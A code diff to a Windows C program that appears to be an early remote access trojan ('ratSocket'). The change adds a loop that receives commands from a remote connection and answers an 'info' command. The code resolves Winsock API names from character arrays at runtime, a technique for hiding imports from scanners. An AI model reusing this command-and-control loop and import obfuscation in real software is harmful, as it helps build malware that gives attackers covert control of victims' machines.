@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <Windows.h>
 #include <stdio.h>
+#include <string.h>
 
 // Ws2_32.dll definitions
 typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
@@ -130,18 +131,31 @@ WinMain(HINSTANCE hInstance,
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
-	char recvBuffer[SOCKET_BUFFER_SIZE];
-	if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+	while(1)
 	{
-		OutputDebugStringA("Error receiving message.");
+		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
+		if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+		{
+			OutputDebugStringA("Error receiving message.");
+		}
+		
+		OutputDebugStringA("Received: ");	
+		if ( strcmp(recvBuffer, "info") == 0 )
+		{
+			OutputDebugStringA("Got info.\n");
+			SocketSend(&ratSocket, "Test2");
+		}
+		else
+		{
+			OutputDebugStringA(recvBuffer);
+			break;
+		}
+		OutputDebugStringA("\n");
+		Sleep(3000);
 	}
-	OutputDebugStringA("Received: ");
-	OutputDebugStringA(recvBuffer);
-	OutputDebugStringA("\n");
 
+	OutputDebugStringA("Exiting...");	
 	Sleep(10000);
-
-	OutputDebugStringA("Exiting...");
 	
 	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
 	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
